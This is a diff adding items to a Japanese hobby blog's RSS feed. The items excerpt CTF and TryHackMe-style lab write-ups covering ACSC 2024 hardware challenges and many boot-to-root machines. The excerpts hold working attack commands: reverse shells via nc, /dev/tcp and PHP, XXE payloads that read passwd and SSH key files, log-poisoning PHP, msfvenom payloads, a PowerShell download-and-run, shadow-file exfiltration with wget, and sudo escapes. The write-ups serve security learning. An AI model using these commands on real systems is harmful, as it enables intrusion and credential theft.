@@ -6,7 +6,338 @@
     <description>Recent content on お茶は綾鷹派</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 20 Nov 2023 17:57:25 +0900</lastBuildDate><atom:link href="http://side-realms.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 31 Mar 2024 13:24:01 +0900</lastBuildDate><atom:link href="http://side-realms.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ACSC 2024 writeup</title>
+      <link>http://side-realms.github.io/writeup/acsc2024/</link>
+      <pubDate>Sun, 31 Mar 2024 13:24:01 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/acsc2024/</guid>
+      <description>ACSC に参加しました． Twitter で hardware ジャンルのある CTF があることを知ったので参加しようと思った次第です． hardware は完答ですが，案の定 hardware 以外は解いていません(解けていません)． 次の writeup で解いてみます． 順位は 800 pts で世界 64/282 位，国内 8/? 位でした.
+An4lyz3_1t(50pts, 140 solved) .sal のバイナリデータが与えられます． logic2 で Async Serial デコードするとフラグが得られます． ボーレートに注意する必要がありますが，この程度なら概算でできると思います． もちろん手でもデコードできます．
+0(ASCII code) 0111 0(ASCII code) 0111...
+みたいな並びになっているので，ASCII code が逆順になっていることに注意して，ゴミを取り除きつつデコードすることができます．
+Valut(150pts, 68 solves) 10 桁の PIN をサイドチャネル攻撃しろ，という問題でした． CTF でサイドチャネル攻撃するなら大抵タイミング攻撃なのでそうだろうと思いつつサーバを触ってみます．
+時間を測ると，入力した PIN を 1 文字ずつチェックして，正解の PIN と一致していたら 0.1 秒の遅延が入るような仕組みになっているようでした．
+以下がスクリプトです． 作り甘いですが&amp;hellip;
+from pwn import * import time list = [&amp;#39;0&amp;#39;,&amp;#39;1&amp;#39;,&amp;#39;2&amp;#39;,&amp;#39;3&amp;#39;,&amp;#39;4&amp;#39;,&amp;#39;5&amp;#39;,&amp;#39;6&amp;#39;,&amp;#39;7&amp;#39;,&amp;#39;8&amp;#39;,&amp;#39;9&amp;#39;] io = remote(&amp;#39;vault.</description>
+    </item>
+    
+    <item>
+      <title>Boiler</title>
+      <link>http://side-realms.github.io/writeup/boiler/</link>
+      <pubDate>Thu, 28 Mar 2024 00:22:47 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/boiler/</guid>
+      <description>user FTP anonymous login .info.txt rabbit hole webmin searchsploit 特になし CMS Joomla Joomla 3.8 joomla-brute とかいろいろ試したけどクレデンシャルが手に入らず RCE 断念 エンドポイントにクレデンシャルが露出しているらしいがアクセスできなかった(ref: How to bypass the admin login page in Joomla &amp;amp; RCE) gobuster をさらにかけると ./_test がアクセスできる それ以外は rabbit hole(いい加減にしてくれ&amp;hellip;) sar2html が動いている searchsploit で探すと RCE ができるらしい ls で log.txt が見つかる cat log.txt でクレデンシャルが見つかる basterd:superduperp@$$ ssh する ssh backup.sh が見つかる パスワードがハードコードしてある stoner にユーザを変える .secret が見つかる root SUID find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&amp;gt; /dev/null find が使えるらしい /usr/bin/find .</description>
+    </item>
+    
+    <item>
+      <title>Internal</title>
+      <link>http://side-realms.github.io/writeup/internal/</link>
+      <pubDate>Wed, 20 Mar 2024 08:06:49 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/internal/</guid>
+      <description>user wordpress っぽいので wpscan wpscan --url http://internal.thm/blog -e admin が見つかる wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt パスワードも見つかる wordpress にログインできた Appearance から 404.php を編集してリバースシェルを入れる(WordPress: Reverse Shell) http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php にアクセス aubreanna にしか権限がないため，user.txt が見れない 分からなすぎるので writeup を見ると，/opt にパスワードがあるらしい(は？) su aubreanna で権限昇格 root aubreanna の /home に jenkins.txt がある aubreanna@internal:~$ cat jenkins.txt cat jenkins.txt Internal Jenkins service is running on 172.17.0.2:8080 ssh トンネル ssh -L 1234:172.17.0.2:8080 aubrenna@internal.thm http://127.0.0.1:8080 で jenkins にアクセスできる hydra 127.0.0.1 -s 8080 -V -f http-form-post &amp;quot;/j_acegi_security_check:j_username=^USER^&amp;amp;j_password=^PASS^&amp;amp;from=%2F&amp;amp;Submit=Sign+in&amp;amp;Login=Login:Invalid username or password&amp;quot; -l admin -P /usr/share/wordlists/rockyou.</description>
+    </item>
+    
+    <item>
+      <title>Rerevand</title>
+      <link>http://side-realms.github.io/writeup/rerevand/</link>
+      <pubDate>Mon, 18 Mar 2024 09:58:44 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/rerevand/</guid>
+      <description>user smb が開いてるのでこれを起点にする enum4linux は動かなかった nmap よく見たら windows だった smbclient -L \\\\ip で使えそうな share を探す nt4wrksv が使えそう パスワードなしで入れる パスワードリストが手に入る nt4wrksv が書き込み可能なのでリバースシェルを入れる(SMB (Server Message Block) Pentesting - Exploit Notes) msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=ip lport=port -f aspx -o shell.asp smb: \&amp;gt; put shell.aspx curl http://10.10.16.163:49663/nt4wrksv/shell.aspx root SeImpersonatePrivilege が使える(Abusing Tokens - HackTricks) wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe を使う eterpreter &amp;gt; getprivs Enabled Process Privileges ========================== Name ---- SeAssignPrimaryTokenPrivilege SeAuditPrivilege SeChangeNotifyPrivilege SeCreateGlobalPrivilege SeImpersonatePrivilege SeIncreaseQuotaPrivilege SeIncreaseWorkingSetPrivilege meterpreter &amp;gt; shell C:\users\bob\desktop&amp;gt;cd c:/inetpub/wwwroot/nt4wrksv cd c:/inetpub/wwwroot/nt4wrksv c:\inetpub\wwwroot\nt4wrksv&amp;gt;dir dir Volume in drive C has no label.</description>
+    </item>
+    
+    <item>
+      <title>Daily Bugle</title>
+      <link>http://side-realms.github.io/writeup/dailybugle/</link>
+      <pubDate>Sun, 17 Mar 2024 04:41:11 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/dailybugle/</guid>
+      <description>user.txt Joomla! というのが動いてる /language/en-GB/en-GB.xml にアクセスするとバージョンが見える(Joomla - HackTricks) searchsploit で SQLi がヒットする python のエクスプロイトコードが出ている(Exploit-Joomla) ユーザ名とパスワードハッシュが得られる Joomla にログイン リバースシェルが template に貼れる(Joomla: Reverse Shell) beez3 に php リバースシェルを貼る save する nc -nlvp 1234 リバースシェル apache としてログイン，権限がなく user.txt が見れない linpeas.sh でパスワードが露出していることが分かる（どういう仕組みなんだこれ） su jjameson root yum が使えるらしい rpm ロードをやろうとしたが fpm が使えず断念 TF=$(mktemp -d) cat &amp;gt;$TF/x&amp;lt;&amp;lt;EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF cat &amp;gt;$TF/y.conf&amp;lt;&amp;lt;EOF [main] enabled=1 EOF cat &amp;gt;$TF/y.py&amp;lt;&amp;lt;EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version=&amp;#39;2.</description>
+    </item>
+    
+    <item>
+      <title>Gamezone</title>
+      <link>http://side-realms.github.io/writeup/gamezone/</link>
+      <pubDate>Sun, 17 Mar 2024 04:41:11 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/gamezone/</guid>
+      <description>user SQLi をする ユーザ名が分かってないので，ユーザ名のところで &#39; or 1=1 -- - portal.php ではレビューのデータベースを検索する リクエストを burp でキャッチ sqlmap -r request.txt --dbms=mysql --dump ハッシュパスワードとユーザ名がもらえる ssh できるようになる root ssh ポートフォワーディング ss -tulpn コマンドで 10000 ポートに外部から入る通信がファイアウォールによってブロックされていることが分かる ssh -L 10000:localhost:10000 &amp;lt;username&amp;gt;@&amp;lt;ip&amp;gt; local で実行する localhost:10000 への通信を，&amp;lt;username&amp;gt;@&amp;lt;ip&amp;gt; を経由して localhost:10000 に転送する SSHトンネル ssh -L 127.0.0.1:8080:example.org:80 ssh-server なので，今回の始点と終点は localhost で，ssh-server が agent47 のサーバ </description>
+    </item>
+    
+    <item>
+      <title>Alfred</title>
+      <link>http://side-realms.github.io/writeup/alfred/</link>
+      <pubDate>Sat, 16 Mar 2024 15:31:32 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/alfred/</guid>
+      <description>user.txt windows で jenkin が動いている admin admin で通る hydra -l admin -P /usr/share/wordlists/rockyou.txt thm.local -s 8080 http-post-form &amp;quot;/j_acegi_security_check:j_username=^USER^&amp;amp;j_password=^PASS^:F=Invalid&amp;quot; -V -t 64 -I Nishang ローカルの Invoke-PowerShellTcp.ps1 があるディレクトリで http サーバを立てる nc -nlvp 1234 jenkins の config -&amp;gt; ビルド -&amp;gt; windows パッチコマンドの実行 powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port build now でリバースシェルがもらえる switch shell msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=ip LPORT=port -f exe -o rv.exe ローカルで python3 -m http.server 8001 powershell で powershell &amp;quot;(New-Object System.</description>
+    </item>
+    
+    <item>
+      <title>Steel</title>
+      <link>http://side-realms.github.io/writeup/steel/</link>
+      <pubDate>Sat, 16 Mar 2024 14:11:33 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/steel/</guid>
+      <description>初めての windows
+user HTTP File Server があるので metasploit で CVE を見つける root windows は PowerUP.ps1 が使える upload /PowerUp.ps1 Invoke-AllChecks AdvancedSystemCareService9 が再起動できるので，悪意ある exe に置き換える msfvenom -p windows/shell_reverse_tcp LHOST=&amp;lt;attacker ip&amp;gt; LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe &amp;ldquo;shell&amp;rdquo; でシェルを起動 sc stop AdvancedSystemCareService9 copy ASCService C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe sc start AdvancedSystemCareService9 </description>
+    </item>
+    
+    <item>
+      <title>Mustacchio</title>
+      <link>http://side-realms.github.io/writeup/mustacchio/</link>
+      <pubDate>Sat, 16 Mar 2024 14:06:52 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/mustacchio/</guid>
+      <description> /custom/js/users.bak というファイルがある． admin:~~ みたいなのがあって，パスワードがハッシュ化されているのでクラックする -行き詰ったので nmap -A -p- ultraseek-http みたいなのが 8765 で開いてる admin ログインできる XML コードを入れられる XXE &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY example &amp;#34;XML Injection&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;&amp;amp;example;&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;Test paragraph&amp;lt;/com&amp;gt; &amp;lt;/comment&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe **SYSTEM** &amp;#39;file:///etc/passwd&amp;#39;&amp;gt;]&amp;gt; &amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;Joe&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt; &amp;lt;/comment&amp;gt; ソースコードに barry, ssh して！みたいなコメントがあったので &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &amp;#39;file:////home/barry/.ssh/id_rsa&amp;#39;&amp;gt;]&amp;gt; &amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;Joe&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt; &amp;lt;/comment&amp;gt; SSH 鍵をゲット フォーマットがウザい - ----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 ~~~ snip ~~~ 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD -----END RSA PRIVATE KEY----- ssh2john root find / -perm -u=s -type f 2&amp;gt;/dev/null live_log を見つける 権限 s strings で tail を見つける 絶対パスじゃないのでパスを追加 /tmp に tail → /bin/bash を作成 export PATH=”/tmp:$PATH” </description>
+    </item>
+    
+    <item>
+      <title>C0ldd</title>
+      <link>http://side-realms.github.io/writeup/c0ldd/</link>
+      <pubDate>Sat, 16 Mar 2024 14:04:24 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/c0ldd/</guid>
+      <description>user wordpress が動いている /hidden C0lld, philip, hugo wpscan --url http://10.10.233.13 -U C0ldd -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64 ログインすると apperrance が触れるので，404.php にリバースシェルを貼る cat /var/www/html/wp-config.php Coldd のパスワードが見える su C0ldd root sudo -l で ftp が使える ftp -&amp;gt; !/bin/bash </description>
+    </item>
+    
+    <item>
+      <title>Archangel</title>
+      <link>http://side-realms.github.io/writeup/archangel/</link>
+      <pubDate>Sat, 16 Mar 2024 13:41:58 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/archangel/</guid>
+      <description>1st flag metafive.thm /etc/host への追加 2nd flag robots.txt にある disallow にアクセスすると php ページに出る LFI GET /test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd エスケープに気を付ける必要がある /home/archangel/user.txt が露出していたので先に見る PHP ラッパで test.php の中身も見ると 2nd flag がある ?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php user.txt さっきのやつ user2.txt ログポイズニング burp suite でパケットをキャッチ ”User-Agent: &amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;” GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var//log/apache2/access.log&amp;amp;cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|sh+-i+2&amp;gt;%261|nc+10.18.127.137+1234+&amp;gt;/tmp/f HTTP/1.1 空白は +, &amp;amp; は %26 にエスケープする local で nc で待ち構えているとリバースシェルがもらえる archangel が user2.txt の権限をもっている crontab /opt/helloworld.sh が動いている echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.18.127.137 4444 &amp;gt;/tmp/f” &amp;gt; /opt/hellowold.sh root.</description>
+    </item>
+    
+    <item>
+      <title>Chocolate</title>
+      <link>http://side-realms.github.io/writeup/chocolate/</link>
+      <pubDate>Sat, 16 Mar 2024 13:28:17 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/chocolate/</guid>
+      <description>user FTP に anonymous ログイン steghide で引き出すと base64 エンコードされたパスワードリストがもらえる nmap したときに localhost うんぬん言われたところにアクセスすると key_rev_key をもらえる strings charlie とパスワードで http にログインするとコードを実行できるフォームが見つかる cat /home/charlie/teleport で ssh 鍵をもらう ssh root vi が使える sudo vi -c &#39;:!/bin/sh&#39; /dev/null </description>
+    </item>
+    
+    <item>
+      <title>Gamingserver</title>
+      <link>http://side-realms.github.io/writeup/gamingserver/</link>
+      <pubDate>Sat, 16 Mar 2024 13:24:19 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/gamingserver/</guid>
+      <description>user.txt /secret secretKey がある -&amp;gt; ssh 鍵 /uploads dict.lst -&amp;gt; ssh パスワード鍵候補？ ssh2john secretKey &amp;gt; hash.txt john —wordlist=dict.lst hash.txt ssh ログイン ユーザ名はソースコードから読む このパターンどうにかならんのか root.txt john が lxd ユーザなのでこれを使う alpine イメージのビルド git clone https://github.com/saghul/lxd-alpine-builder.git cd .lxd-alpine-builder /build-alpine イメージ作成（管理者権限付き） lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myContainer lxc init myContainer myVM -c security.privileged=true lxc config device add myVM mydevice disk source=/ path=/mnt/root recursive=true 起動 lxc start myVM lxc exec myVM /bin/sh </description>
+    </item>
+    
+    <item>
+      <title>Chill</title>
+      <link>http://side-realms.github.io/writeup/chill/</link>
+      <pubDate>Sat, 16 Mar 2024 11:49:38 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/chill/</guid>
+      <description>user.txt gobuster で見つかった /secret にアクセスすると linux コマンドを実行できるサイトが見つかる ls を実行すると are you hacker? っていうアラートが出る pwd;ls だとアラートが出ず，実行結果が見える ここにリバースシェルを入れればいい whoami;php -r &#39;$sock=fsockopen(&amp;quot;your-vpn-ip&amp;quot;,4444);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39; www-data では何もできない sudo -l で，.helpline.sh が apaar として実行できるっぽい .helpline.sh を見ると，$msg 2&amp;gt;/dev/null が見える /bin/bash を実行すれば apaar としてシェルをもらえる root.txt linpeas.sh 127.0.0.1:9001 が localhost から実行できるらしい で，ここに mysql が動いてる local で ssh-keygen echo &amp;quot;contents of .pub&amp;quot; &amp;gt;&amp;gt; /home/apaar/.ssh/authorized_keys ssh -L 9001:127.0.0.1:9001 apaar@10.10.233.203 -i id_rsa index.php を見ると root とパスワードが載ってる apaar から mysql にログイン mysql -h localhost -u root -p show databese show tables SELECT * FROM users -&amp;gt; anurodh のパスワード customer portal みたいなとこからログインして，images をダウンロードする steghide —extract -sf .</description>
+    </item>
+    
+    <item>
+      <title>Wgel</title>
+      <link>http://side-realms.github.io/writeup/wgel/</link>
+      <pubDate>Sat, 16 Mar 2024 11:43:01 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/wgel/</guid>
+      <description>user.txt unapp というアプリが使われている searchsploit は特になし /sitemap/.ssh .ssh から id_rsa を持ってくる ssh2john id_rsa &amp;gt; hash.txt ユーザ名はソースコードで jessie ssh -i id_rsa jessie@10.10.217.228 root.txt wget が sudo で使えるらしいが GTFObin ではうまくいかない wget privilege escalation でググる ローカルで nc -lvnp 4444 ターゲットで sudo /usr/bin/wget --post-file=/etc/shadow &amp;lt;local-ip&amp;gt; 4444 /etc/shadow が見えるのでコピーする ローカルで ./shadow.txt とかで保存 ローカルで新しいハッシュを作る openssl passwd -6 -salt &#39;salt&#39; &#39;password’ これを shadow.txt に追記 root:$6$salt$IxDD...DCy.g.:18195:0:99999:7::: これを転送 sudo /usr/bin/wget http://&amp;lt;local-ip&amp;gt;:8000/shadow.txt -O /etc/shadow </description>
+    </item>
+    
+    <item>
+      <title>Ignite</title>
+      <link>http://side-realms.github.io/writeup/ignite/</link>
+      <pubDate>Sat, 16 Mar 2024 11:39:35 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/ignite/</guid>
+      <description>user.txt searchsploit fuel CMS RCE URL とプロキシを設定しなおす必要アリ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.18.127.137 1234 &amp;gt; /tmp/f find / 2&amp;gt;/dev/null | grep flag.txt root.txt sudo , crontab, linpeas も特になし 細かく linpeas を見ていく password -&amp;gt; mememe みたいなのがある su で使えてしまう </description>
+    </item>
+    
+    <item>
+      <title>Brooklyn</title>
+      <link>http://side-realms.github.io/writeup/brooklyn/</link>
+      <pubDate>Sat, 16 Mar 2024 11:36:42 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/brooklyn/</guid>
+      <description>user.txt FTP jake がユーザー名？ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.10.241 ssh find / 2&amp;gt;/dev/null | grep user.txt root.txt less sudo less /etc/profile !/bin/sh </description>
+    </item>
+    
+    <item>
+      <title>Bruteit</title>
+      <link>http://side-realms.github.io/writeup/bruteit/</link>
+      <pubDate>Sat, 16 Mar 2024 11:33:52 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/bruteit/</guid>
+      <description>user.txt ソースコードを見ると admin がある hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.184.144 http-form-post &amp;quot;/admin/:user=^USER^&amp;amp;pass=^PASS^:Username or password invalid id_rsa がもらえる ssh2john id_rsa &amp;gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt chmod 666 id_rsa ssh -i id_rsa john@10.10.184.144 root.txt sudo -l で cat LFILE=/etc/shadow john@bruteit:~$ sudo cat $LFILE root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7::: これを john で解析する su root </description>
+    </item>
+    
+    <item>
+      <title>Skynet</title>
+      <link>http://side-realms.github.io/writeup/skynet/</link>
+      <pubDate>Sat, 16 Mar 2024 11:17:21 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/skynet/</guid>
+      <description>user.txt smb なので enum4linux anonymous milesdyson anonymous でアクセスするとファイルがもらえる パスワードリストをもってくる hydra -l milesdyson -P log1.txt [IP] http-form-post &amp;quot;/squirrelmail/src/redirect.php:login_username=^USER^&amp;amp;secretkey=^PASS^&amp;amp;js_autodetect_results=1&amp;amp;just_logged_in=1:Unknown user or password incorrect.&amp;quot; squirrelmail にアクセス )s{A&amp;amp;2Z=F^n_E.B` を受け取る smb に milesdyson でアクセス smbclient //10.10.35.53/milesdyson --user=milesdyson /45kra24zxs28v3yd というディレクトリがあるらしい gobuster dir -u http://10.10.35.53/45kra24zxs28v3yd cuppa が使われている searchsploit cuppa CMS リバースシェルを立てる root.txt crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don&amp;#39;t have to run the `crontab&amp;#39; # command to install the new version when you edit this file # and files in /etc/cron.</description>
+    </item>
+    
+    <item>
+      <title>Lazyadmin</title>
+      <link>http://side-realms.github.io/writeup/lazyadmin/</link>
+      <pubDate>Sat, 16 Mar 2024 11:11:11 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/lazyadmin/</guid>
+      <description>enum nmap 22:ssh 80:http gobuster content user.txt searchsploit sweetrice cat /usr/share/exploitdb/exploits/php/webapps/40718.txt You can access to all mysql backup and download them from this directory. http://localhost/inc/mysql_backup and can access to website files backup from: http://localhost/SweetRice-transfer.zip mysql のバックアップ？に接続できるらしい http://10.10.61.5/content/inc/mysql_backup/ manager とパスワードのハッシュが見つかる Arbitary file upload みたいなのを実行する http://10.10.61.5/content/attachment/./shell.php5 に php が出てくるのでアクセスするとリバースシェルを獲得できる root.txt sudo -l $ sudo -l Matching Defaults entries for www-data on THM-Chal: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on THM-Chal: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.</description>
+    </item>
+    
+    <item>
+      <title>Bounty</title>
+      <link>http://side-realms.github.io/writeup/bounty/</link>
+      <pubDate>Sat, 16 Mar 2024 11:06:05 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/bounty/</guid>
+      <description>enum nmap 21:ftp 22:ssh ftp locks.txt task.txt user.txt hydra ssh で locks.txt を使う user.txt が見える root.txt sudo -l で ```(root) /bin/tar sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh root.txt ゲット </description>
+    </item>
+    
+    <item>
+      <title>Blog</title>
+      <link>http://side-realms.github.io/writeup/blog/</link>
+      <pubDate>Sat, 16 Mar 2024 10:57:51 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/blog/</guid>
+      <description>enum 22:ssh 80:http enum4linux BillySMB という share がある bjoel, smb というユーザーがある SMB BillySMB にパスワード無しで入れる よく分からん .txt と .mp4, .png しかない steghide も特になし wpscan wpscan --url http://10.10.208.138/ -e u ユーザ名が bjoel, kwheel wpscan --url http://10.10.208.138 -U bjoel,kwheel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64 kwheel:cutiepie1 ssh はできない metasploit search crop-image options で設定するとシェルがもらえる user.txt find / 2&amp;gt;/dev/null | grep user.txt $ cat /home/bjoel/user.txt You won&amp;#39;t find what you&amp;#39;re looking for here. TRY HARDER は？ priviledge escalation find / -perm -u=s -type f 2&amp;gt;/dev/null ls -la /usr/sbin/checker -rwsr-sr-x 1 root root 8432 May 26 2020 /usr/sbin/checker ltrace checker getenv(&amp;#34;admin&amp;#34;) = nil puts(&amp;#34;Not an Admin&amp;#34;) = 13 Not an Admin admin という環境変数があるのでこれを設定してみる ltrace checker getenv(&amp;#34;admin&amp;#34;) = &amp;#34;1&amp;#34; setuid(0) = -1 system(&amp;#34;/bin/bash&amp;#34;) あとは実行してシェルをもらうと root になる </description>
+    </item>
+    
+    <item>
+      <title>Cyborg</title>
+      <link>http://side-realms.github.io/writeup/cyborg/</link>
+      <pubDate>Wed, 21 Feb 2024 07:18:48 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/cyborg/</guid>
+      <description>ウェルベルムコトハちゃんの事実を曲げる能力強すぎない？
+enum nmap 22/ssh 80/http gobuster /admin /etc ssh /etc にアクセスすると squid プロキシの情報が見れる ユーザ名とパスワードハッシュの組み合わせが見えるのでこれを使う とりあえず john でパスワードを手に入れる ssh にこれを使ったけど通らなかった hydra も通らない http に戻るとバックアップファイルをダウンロードするところがあったのでダウンロードする tar -xvf archive.tar borg というバックアップアプリを使っているらしい borg list /home/kali/THM/home/field/dev/final_archive borg extract /home/kali/THM/home/field/dev/final_archive::music_archive borg の使い方に少し苦労した ユーザ名は alex, パスワードも note.txt に書いてある root.txt ssh する sudo -l で /etc/mp3backups/backup.sh が見つかる while getopts c: flag do case &amp;#34;${flag}&amp;#34; in c) command=${OPTARG};; esac done --- (snip) --- cmd=$($command) echo $cmd -c オプションでコマンドを実行できる(なんのため？) sudo /etc/mp3backups/backup.</description>
+    </item>
+    
+    <item>
+      <title>StartUp</title>
+      <link>http://side-realms.github.io/writeup/startup/</link>
+      <pubDate>Wed, 21 Feb 2024 02:52:30 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/startup/</guid>
+      <description>最近 KAGOME の朝フルーツこれ一本を昼ごはんにしている
+健康になった気でいる
+enum nmap ftp ssh http gobuster files FTP anonymous ログインができる http から files で中身が見れて，ftp の中身が同期していることが分かる php のリバースシェルを配置する put php-reverse-shell.php シェル とりあえず中に入るとレシピが見れる lennie でログインする必要がある ./incidents ディレクトリ内で .pcapng が手に入る wireshark で .pcapng の TCP ストリームを追うとパスワードが手に入る これが lennie のパスワードだった(!?) あとは user.txt root.txt ./linpeas.sh はすぐに使えそうなものはない．．． ./scripts ディレクトリがあるので探してみる ./planner.sh が root で動作している ./planner.sh が呼び出す ./print.sh は lennie が所有している lennei で print.sh を書き換えて bash を呼び出せば root シェルが手に入る echo &amp;quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/[ip]/8888 0&amp;gt;&amp;amp;1&amp;quot; &amp;gt; /etc/print.</description>
+    </item>
+    
+    <item>
+      <title>SimpleCTF</title>
+      <link>http://side-realms.github.io/writeup/simplectf/</link>
+      <pubDate>Wed, 21 Feb 2024 02:31:08 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/simplectf/</guid>
+      <description>デュエマ，ゼニスというか昔のキャラが復活しているらしく，非常にやりたい
+動画見たら 4t ゼニスとかあって笑った
+enum nmap 21/ftp 80/http 2222/ssh gobuster simple CVE CMS 2.2.8 で構成されたサイトが見つかる CVE-2019-9053 で SQLi が通るっぽい PoC を指してuser name と password を手に入れる ssh user.txt が手に入る sudo -l で vim がパスワード無しで使えるらしい sudo vim -c &#39;:!/bin/sh&#39; root.txt が手に入る </description>
+    </item>
+    
+    <item>
+      <title>BasicPentesting</title>
+      <link>http://side-realms.github.io/writeup/basicpentesting/</link>
+      <pubDate>Wed, 21 Feb 2024 02:21:30 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/basicpentesting/</guid>
+      <description>friko, マジでアツい
+radio head でもあり bright eyes でもあり全曲の殺意がまんべんなく高い\
+enum 22/ssh 80/http 8009/ajp 8080/http-proxy SMB SMB が空いてるようだったのでログインする enum4linux 10.10.77.150 smbclient \\\\10.10.77.150\\Anonymous -U Anonymous more staff.txt user name は Jan ? ssh ssh でブルートフォース hydra -t 16 -l jan -P /usr/share/wordlists/rockyou.txt 10.10.77.150 ssh Jan じゃなくて jan なのキモすぎ，揃えてくれ ssh ログイン Kay が見つかる .ssh が見つかったので id_rsa を持ってきて ssh2john scp jan@10.10.77.150:/home/kay/.ssh/id_rsa ./ - ssh2john id_rsa &amp;gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt chmod 600 ./id_rsa ssh -i id_rsa kay@10.</description>
+    </item>
+    
+    <item>
+      <title>RootMe</title>
+      <link>http://side-realms.github.io/writeup/rootme/</link>
